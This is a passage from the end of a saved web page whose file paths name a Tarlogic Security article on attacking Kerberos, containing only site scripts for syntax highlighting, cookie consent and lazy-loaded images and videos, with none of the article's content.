src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/cookies_bar-f21e2e7a9390b6331b63ef235c3c8493.js"></script> <script data-minify="1" type="text/javascript" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/lazysizes-b725167848bd842720fbdd71c89b5e3e.js"></script> <script data-minify="1" async="async" type="text/javascript" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/form-8e1a6781150e963fb3b51869cf343457.js"></script> <script data-minify="1" type="text/javascript" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/footer_map_offices-288f3cfd1cbad82ca8a5259c06b10f32.js"></script> <script type="text/javascript">/* <![CDATA[ */ EnlighterJS_Config = {"selector":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"language":"generic","theme":"git","indent":2,"hover":"hoverEnabled","showLinenumbers":true,"rawButton":true,"infoButton":false,"windowButton":true,"rawcodeDoubleclick":false,"grouping":true,"cryptex":{"enabled":false,"email":"mail@example.tld"}};!function(){var a=function(a){var b="Enlighter Error: ";console.error?console.error(b+a):console.log&&console.log(b+a)};return window.addEvent?"undefined"==typeof EnlighterJS?void a("Javascript Resources not loaded yet!"):"undefined"==typeof EnlighterJS_Config?void a("Configuration not loaded yet!"):void window.addEvent("domready",function(){EnlighterJS.Util.Init(EnlighterJS_Config.selector.block,EnlighterJS_Config.selector.inline,EnlighterJS_Config)}):void a("MooTools Framework not loaded yet!")}();; /* ]]> */</script> <div id="js-tar_cookiesBar" class="tar_cookiesBar" style="bottom: -91px;"><div class="tar_cookiesBar__text"><p>We
 use cookies to provide social media features and to analyse our 
traffic. We also share information about your use of our site with 
advertising, analytics partners and with online chat services.</p> <a href="https://www.tarlogic.com/politica-de-privacidad" target="_blank" class="tar_cookiesBar__link">Privacy policy</a> · <a id="js-tarOpenModal" href="javascript://" class="tar_cookiesBar__link">Cookies info</a></div> <button id="js-tar_cookiesAccepted" class="tar_cookiesBar__btn">I agree</button></div><div id="js-tarModal" class="tar_modal"><div class="tar_modal__container"><div id="js-tarCloseModal" class="tar_modal__close"> <i class="fa fa-times"></i></div><div class="tar_modal__content"><h6 class="tar_modal__subtitle">Necesary</h6><p class="tar_cookies_info">Used by the content network, Cloudflare, to identify trusted web traffic</p><p class="tar_cookies" data-cookie="necesary">_cfduid</p><h6 class="tar_modal__subtitle">Settings</h6><p class="tar_cookies_info">It's used to serve the user's preferred language on the website</p><p class="tar_cookies" data-cookie="settings">_icl_current_language</p><h6 class="tar_modal__subtitle">Statistics</h6><p class="tar_cookies_info">These
 cookies help us to understand how visitors interact with our website, 
collecting and reporting data about your interaction within our website</p><p class="tar_cookies" data-cookie="statistics">_ga,_gat*,
 _gid, _hjid, _hjClosedSurveyInvites, _hjDonePolls, _hjMinimizedPolls, 
_hjDoneTestersWidgets, _hjMinimizedTestersWidgets, _hjDoneSurveys, 
_hjIncludedInSample, _hjShownFeedbackMessage, hjSiteLang</p><h6 class="tar_modal__subtitle">Marketing</h6><p class="tar_cookies_info">Marketing
 cookies are used to track visitor across websites. The intention is to 
display ads that are relevant and engaging for the individual user an 
thereby more valuable for publishers and third party advertisers.</p><p class="tar_cookies" data-cookie="marketing">bcookie, bscookie, lidc, NID</p></div></div></div> <script>window.lazyLoadOptions={elements_selector:"iframe[data-lazy-src]",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,callback_loaded:function(element){if(element.tagName==="IFRAME"&&element.dataset.rocketLazyload=="fitvidscompatible"){if(element.classList.contains("lazyloaded")){if(typeof window.jQuery!="undefined"){if(jQuery.fn.fitVids){jQuery(element).parent().fitVids()}}}}}};window.addEventListener('LazyLoad::Initialized',function(e){var lazyLoadInstance=e.detail.instance;if(window.MutationObserver){var observer=new MutationObserver(function(mutations){var image_count=0;var iframe_count=0;var rocketlazy_count=0;mutations.forEach(function(mutation){for(i=0;i<mutation.addedNodes.length;i++){if(typeof mutation.addedNodes[i].getElementsByTagName!=='function'){return}
if(typeof mutation.addedNodes[i].getElementsByClassName!=='function'){return}
images=mutation.addedNodes[i].getElementsByTagName('img');is_image=mutation.addedNodes[i].tagName=="IMG";iframes=mutation.addedNodes[i].getElementsByTagName('iframe');is_iframe=mutation.addedNodes[i].tagName=="IFRAME";rocket_lazy=mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');image_count+=images.length;iframe_count+=iframes.length;rocketlazy_count+=rocket_lazy.length;if(is_image){image_count+=1}
if(is_iframe){iframe_count+=1}}});if(image_count>0||iframe_count>0||rocketlazy_count>0){lazyLoadInstance.update()}});var b=document.getElementsByTagName("body")[0];var config={childList:!0,subtree:!0};observer.observe(b,config)}},!1)</script><script data-no-minify="1" async="" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/lazyload.js"></script><script>function lazyLoadThumb(e){var t='<img src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="" width="480" height="360">',a='<div class="play"></div>';return t.replace("ID",e)+a}function lazyLoadYoutubeIframe(){var e=document.createElement("iframe"),t="ID?autoplay=1";t+=0===this.dataset.query.length?'':'&'+this.dataset.query;e.setAttribute("src",t.replace("ID",this.dataset.src)),e.setAttribute("frameborder","0"),e.setAttribute("allowfullscreen","1"),e.setAttribute("allow", "accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"),this.parentNode.replaceChild(e,this)}document.addEventListener("DOMContentLoaded",function(){var e,t,a=document.getElementsByClassName("rll-youtube-player");for(t=0;t<a.length;t++)e=document.createElement("div"),e.setAttribute("data-id",a[t].dataset.id),e.setAttribute("data-query", a[t].dataset.query),e.setAttribute("data-src", a[t].dataset.src),e.innerHTML=lazyLoadThumb(a[t].dataset.id),e.onclick=lazyLoadYoutubeIframe,a[t].appendChild(e)});</script> 
<div class="lightbox"><div class="lightbox__modal"><img></div><div class="lightbox__close">x</div></div></body></html>